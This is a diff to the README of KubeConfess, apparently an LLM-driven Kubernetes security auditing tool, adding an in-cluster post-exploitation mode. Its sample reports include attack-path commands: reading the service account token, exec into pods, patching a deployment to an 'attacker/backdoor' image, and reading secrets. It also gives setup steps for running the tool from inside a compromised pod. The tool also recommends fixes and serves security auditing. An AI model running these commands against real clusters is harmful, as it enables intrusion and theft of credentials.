@@ -49,7 +49,7 @@ It's also a learning project. If you've ever wanted to understand how AI agents 
 ### Permission Auditing
 - Simulates `kubectl auth can-i` for a curated list of security-relevant verb/resource combinations
 - Covers secrets, pods/exec, RBAC bindings, wildcard permissions, and more
-- Scoped to a namespace or cluster-wide
+- Scoped to a namespace or cluster-wide — auto-discovers accessible namespaces
 
 ### RBAC Analysis
 - List Roles and ClusterRoles with their full rule breakdown
@@ -63,6 +63,11 @@ It's also a learning project. If you've ever wanted to understand how AI agents 
 - Produces a structured report: findings, attack paths, blast radius, and recommended fixes
 - Supports pods, namespaces, and service accounts as starting points
 
+### In-Cluster Mode
+- Run inside a pod with no kubeconfig needed — uses the mounted ServiceAccount token automatically
+- Scans the pod itself: capabilities, runtime sockets, host mounts, PID namespace, cloud metadata endpoints, sensitive env vars, and credential files
+- Designed for the post-exploitation scenario: you've landed in a pod and want to know what you can do from there
+
 ---
 
 ## Setup
@@ -70,7 +75,7 @@ It's also a learning project. If you've ever wanted to understand how AI agents 
 ### Prerequisites
 
 - Python 3.10+
-- A Kubernetes cluster with a kubeconfig file
+- A Kubernetes cluster with a kubeconfig file, or shell access inside a pod
 - An API key for any OpenAI-compatible provider
 
 ### Install
@@ -87,21 +92,27 @@ pip install -r requirements.txt
 
 ### Configure
 
-Create `config/vars.py` — this file is gitignored and never committed:
+All config is read from environment variables — no secrets file needed:
 
-```python
-# config/vars.py
-API_KEY  = "your-api-key-here"
-BASE_URL = "https://api.anthropic.com/v1"   # Claude  (default)
-# BASE_URL = "https://api.openai.com/v1"    # OpenAI
-# BASE_URL = "http://localhost:11434/v1"    # Ollama  (local, no key needed)
-MODEL    = "claude-haiku-4-5"               # or gpt-4o, llama3, gemma3, etc.
+```bash
+export ANTHROPIC_API_KEY="your-api-key-here"
+export BASE_URL="https://api.anthropic.com/v1"   # Claude  (default)
+# export BASE_URL="https://api.openai.com/v1"    # OpenAI
+# export BASE_URL="http://localhost:11434/v1"    # Ollama  (local)
+export MODEL_NAME="claude-haiku-4-5"             # or gpt-4o, llama3, etc.
 ```
 
-### Run
+### Run — external mode
 
 ```bash
 python main.py --kubeconfig ~/.kube/config
+```
+
+### Run — in-cluster mode
+
+```bash
+export ANTHROPIC_API_KEY=sk-ant-...
+python main.py --incluster
 ```
 
 ---
@@ -144,100 +155,38 @@ you> investigate sa/deployer -n staging
 ```
 ⚡ Investigating: pod/pod-developer -n test-custom
 
-# KUBERNETES ATTACK PATH INVESTIGATION REPORT                                                                                                                                              │
-│ **Target:** `pod/pod-developer` -n `test-custom`                                                                                                                                           │
-│                                                                                                                                                                                            │
-│ ---                                                                                                                                                                                        │
-│                                                                                                                                                                                            │
-│ ## STARTING POINT                                                                                                                                                                          │
-│                                                                                                                                                                                            │
-│ **Identity:** ServiceAccount `developer-sa` (test-custom namespace)                                                                                                                        │
-│ - Automount enabled (token automatically injected into pod)                                                                                                                                │
-│ - Bound to `developer-role` via RoleBinding `developer-binding`                                                                                                                            │
-│                                                                                                                                                                                            │
-│ **Baseline Access:**                                                                                                                                                                       │
-│ - `get, list, watch` on pods, services, configmaps                                                                                                                                         │
-│ - `create` on pods/exec                                                                                                                                                                    │
-│ - `get, list` on secrets                                                                                                                                                                   │
-│ - `get, list` on deployments                                                                                                                                                               │
-│ - `patch, update` on deployments                                                                                                                                                           │
-│ - Container runs as **root** (no securityContext restriction)                                                                                                                              │
-│                                                                                                                                                                                            │
-│ ---                                                                                                                                                                                        │
-│                                                                                                                                                                                            │
-│ ## FINDINGS                                                                                                                                                                                │
-│                                                                                                                                                                                            │
-│ ### 1. **Excessive Pod Exec Permission (CRITICAL)**                                                                                                                                        │
-│ The `developer-sa` has `create pods/exec` permission, allowing remote code execution into any pod in the namespace.                                                                        │
-│                                                                                                                                                                                            │
-│ ### 2. **Secret Read Access (HIGH)**                                                                                                                                                       │
-│ The `developer-sa` can `get` and `list` all secrets in the test-custom namespace. While no secrets currently exist in-scope, this permission is granted and will expose any future secrets │
-│ created.                                                                                                                                                                                   │
-│                                                                                                                                                                                            │
-│ ### 3. **Deployment Modification Capability (HIGH)**                                                                                                                                       │
-│ The `developer-sa` can `patch` and `update` deployments. This allows:                                                                                                                      │
-│ - Injection of malicious containers                                                                                                                                                        │
-│ - Modification of service accounts assigned to workloads                                                                                                                                   │
-│ - Image injection/supply chain attack                                                                                                                                                      │
-│                                                                                                                                                                                            │
-│ ### 4. **Cross-Namespace Secret Enumeration (HIGH)**                                                                                                                                       │
-│ The `cross-ns-reader-sa` (also in test-custom) has a ClusterRoleBinding to `cross-namespace-reader`, which grants:                                                                         │
-│ - `get, list` secrets **across all namespaces**                                                                                                                                            │
-│ - `get, list` pods and deployments cluster-wide                                                                                                                                            │
-│                                                                                                                                                                                            │
-│ Since `pod-developer` shares the namespace with this SA and automount is enabled, lateral movement to this SA is plausible.                                                                │
-│                                                                                                                                                                                            │
-│ ### 5. **All Pods Run as Root (HIGH)**                                                                                                                                                     │
-│ Four containers run with no securityContext, defaulting to UID 0 (root). A process breakout or vulnerability gains full root access to the container filesystem.                           │
-│                                                                                                                                                                                            │
-│ ### 6. **Overly Permissive Default ServiceAccount (MEDIUM)**                                                                                                                               │
-│ The `default` SA in test-custom has automount enabled but no bindings. However, it exists and could be exploited if a pod mistakenly uses it.                                              │
-│                                                                                                                                                                                            │
-│ ---                                                                                                                                                                                        │
-│                                                                                                                                                                                            │
-│ ## ATTACK PATHS                                                                                                                                                                            │
-│                                                                                                                                                                                            │
-│ ### **Path 1: Pod Exec → Lateral Movement → Namespace Escape**                                                                                                                             │
-│ 1. From inside `pod-developer`, read the injected service account token:                                                                                                                   │
-│    ```bash                                                                                                                                                                                 │
-│    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)                                                                                                                        │
-│    ```                                                                                                                                                                                     │
-│                                                                                                                                                                                            │
-│ 2. Use the token to exec into any pod in test-custom:                                                                                                                                      │
-│    ```bash                                                                                                                                                                                 │
-│    kubectl exec -it app-deployment-7648b5cb9-bhrwl -n test-custom -- /bin/sh                                                                                                               │
-│    ```                                                                                                                                                                                     │
-│                                                                                                                                                                                            │
-│ 3. Inside that pod, if it has higher privileges or different secrets mounted, escalate further.                                                                                            │
-│                                                                                                                                                                                            │
-│ 4. If a pod in kube-system or another namespace is accessible via network/DNS, pivot to attack cluster control plane.                                                                      │
-│                                                                                                                                                                                            │
-│ ---                                                                                                                                                                                        │
-│                                                                                                                                                                                            │
-│ ### **Path 2: Deployment Patch → Container Injection → RCE**                                                                                                                               │
-│ 1. List deployments:                                                                                                                                                                       │
-│    ```bash                                                                                                                                                                                 │
-│    kubectl get deployments -n test-custom                                                                                                                                                  │
-│    ```                                                                                                                                                                                     │
-│                                                                                                                                                                                            │
-│ 2. Patch the `app-deployment` to inject a malicious sidecar or replace the image:                                                                                                          │
-│    ```bash                                                                                                                                                                                 │
-│    kubectl patch deployment app-deployment -n test-custom -p \                                                                                                                             │
-│      '{"spec":{"template":{"spec":{"containers":[{"name":"app","image":"attacker/backdoor:latest"}]}}}}'                                                                                   │
-│    ```                                                                                                                                                                                                                                                                                                                                                                           
-│ 3. All replicas restart with the malicious image, running as **root**.                                                                                                                     │
-                                                                                                                                                                                         
-│ 4. The attacker gains root shell in multiple pods simultaneously.                                                                                                                                                                                                                                                                                                                 
-│ ---                                                                                                                                                                                                                                                                                         
-│ ### **Path 3: Cross-Namespace Secret Exfiltration**                                                                                                                                        │
-│ 1. The namespace contains `cross-ns-reader-sa` with ClusterRole granting cluster-wide secret `get/list`.                                                                                   │
-                                                                                                                                                                                       
-│ 2. Compromise or impersonate this SA (via RBAC misconfiguration or shared node):                                                                                                           │
-│    ```bash                                                                                                                                                                                 │
-│    kubectl get secrets -A --as=system:serviceaccount:test-custom:cross-ns-reader-sa                                                                                                        │
-│    ```                                                                                                                                                                                                                                                                                                                                                                       
-│ 3. Dump all cluster secrets (DB credentials, API keys, TLS certs, cloud credentials):                                                                                                      │
-│    ```bash   
+STARTING POINT
+  pod/pod-developer in test-custom running as developer-sa
+  Bound to developer-role via RoleBinding developer-binding
+  Baseline: get/list/watch pods, create pods/exec, get/list secrets, patch deployments
+
+FINDINGS
+  ⚠ CRITICAL — create pods/exec allowed — RCE into any pod in namespace
+  ⚠ HIGH     — get/list secrets — all secrets in namespace readable
+  ⚠ HIGH     — patch deployments — can inject malicious containers
+  ⚠ HIGH     — all pods run as root — no securityContext set
+
+ATTACK PATHS
+  1. Read injected SA token → exec into any pod in test-custom
+     kubectl exec -it app-deployment-7648b5cb9 -n test-custom -- /bin/sh
+
+  2. Patch deployment to inject malicious image → root shell in all replicas
+     kubectl patch deployment app-deployment -n test-custom -p \
+       '{"spec":{"template":{"spec":{"containers":[{"name":"app","image":"attacker/backdoor"}]}}}}'
+
+  3. Read secrets → extract DB credentials, API keys, cloud credentials
+     kubectl get secret db-credentials -n test-custom -o jsonpath='{.data}'
+
+BLAST RADIUS
+  Full control of test-custom namespace. Readable secrets expose production
+  database credentials and cloud keys. Deployment patch gives persistent
+  root access across all replicas.
+
+RECOMMENDED FIXES
+  1. Remove create pods/exec — scope to specific pods if needed
+  2. Remove secrets get/list — use projected volumes with specific keys
+  3. Remove patch/update on deployments
+  4. Set securityContext.runAsNonRoot: true on all containers
 ```
 
 After the report prints you stay in the chat — ask follow-up questions grounded in the findings:
@@ -246,6 +195,77 @@ After the report prints you stay in the chat — ask follow-up questions grounde
 you> give me the exact kubectl command to read that AWS secret
 you> what YAML do I apply to fix the RBAC binding?
 you> which other pods in payments are worth targeting?
+```
+
+### In-cluster mode — landed in a pod
+
+The scenario: you have shell access inside a pod. No kubeconfig. You want to know where you are, what you can do, and what the blast radius is.
+
+**If the pod has Python:**
+```bash
+export ANTHROPIC_API_KEY=sk-ant-...
+git clone https://github.com/arnavtripathy/KubeConfess.git
+cd KubeConfess
+pip install -r requirements.txt
+python main.py --incluster
+```
+
+**If the pod is Alpine (minimal image):**
+```sh
+# install Python and git first
+apk add --no-cache python3 py3-pip git
+
+# clone and install
+git clone https://github.com/arnavtripathy/KubeConfess.git
+cd KubeConfess
+pip3 install -r requirements.txt --break-system-packages
+
+# set API key and run
+export ANTHROPIC_API_KEY=sk-ant-...
+python3 main.py --incluster
+```
+
+**If there's no internet access inside the pod — copy from outside:**
+```bash
+# from your machine
+kubectl cp . <namespace>/<pod>:/tmp/kubeconfess
+
+# exec into the pod
+kubectl exec -it <pod> -n <namespace> -- /bin/sh
+
+# inside
+cd /tmp/kubeconfess
+apk add --no-cache python3 py3-pip
+pip3 install -r requirements.txt --break-system-packages
+export ANTHROPIC_API_KEY=sk-ant-...
+python3 main.py --incluster
+```
+
+**If you can create pods — spawn one with Python:**
+```bash
+kubectl run kubeconfess \
+  --image=python:3.11-slim \
+  --serviceaccount=<target-sa> \
+  --restart=Never \
+  -n <namespace> \
+  -it --rm \
+  -- /bin/bash
+
+# inside
+git clone https://github.com/arnavtripathy/KubeConfess.git
+cd KubeConfess
+pip install -r requirements.txt
+export ANTHROPIC_API_KEY=sk-ant-...
+python main.py --incluster
+```
+
+**Once running in-cluster, start here:**
+```
+you> scan this pod
+you> what can I do?
+you> list secrets in all namespaces
+you> investigate namespace/default
+you> investigate pod/juicy-pod -n payments
 ```
 
 ---
@@ -275,7 +295,7 @@ Investigate mode works differently — instead of an agentic loop, your Python c
 
 The AI never sees your Python implementation — it only sees the tool's `name`, `description`, and `parameters` schema. This means **the description you write is everything**. If it's vague, the AI will call the wrong tool or not call it at all.
 
-### The three files that matter
+### The files that matter
 
 **`agent.py`** is the brain. It holds the AI client, combines all tool definitions into one list, and runs the agentic loop — sending messages to the AI, detecting tool call requests, executing them, feeding results back, and looping until the AI produces a final answer. If you want to understand agents, read this file first. It's about 50 lines.
 
@@ -294,11 +314,10 @@ KubeConfess/
 ├── requirements.txt
 │
 ├── config/
-│   ├── vars.py                      ← API key + model config (gitignored)
 │   └── exceptions.py                ← namespace exceptions for known risks
 │
 └── kube_functions/
-    ├── connector.py                 ← kubeconfig loading, returns k8s clients
+    ├── connector.py                 ← kubeconfig / incluster config, returns k8s clients
     ├── prompts.py                   ← system prompt + investigate prompt
     ├── investigate.py               ← fixed tool sequence for investigate mode
     │
@@ -319,7 +338,8 @@ KubeConfess/
         ├── __init__.py              ← registry for security tools
         ├── privileged.py
         ├── root_containers.py
-        └── hostpath_mounts.py
+        ├── hostpath_mounts.py
+        └── pod_self_scan.py         ← in-cluster pod self-enumeration
 ```
 
 ---
@@ -456,6 +476,7 @@ If you find a bug, open an issue with what you typed, the `⚙` tool line that a
 openai>=1.0.0
 kubernetes>=29.0.0
 rich>=13.0.0
+requests>=2.31.0
 ```
 
 ---
